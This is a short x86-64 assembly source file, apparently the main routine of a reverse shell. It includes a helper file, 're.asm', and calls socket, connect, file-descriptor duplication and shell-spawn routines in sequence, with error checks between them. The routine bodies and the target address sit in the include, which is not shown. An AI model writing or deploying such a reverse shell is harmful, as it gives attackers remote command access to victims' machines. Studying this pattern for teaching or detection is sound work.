%include 'include/re.asm'

section .text
    global _start

_start:
    call _socket
    cmp rax, 3
    jne _exit_error

    call _connect
    cmp rax, -111
    je _exit_error

    call _dup_fd
    cmp rax, 0
    jne _exit_error
    
    call _shell_spawn
    cmp rax, -1
    je _exit_error

    call _exit
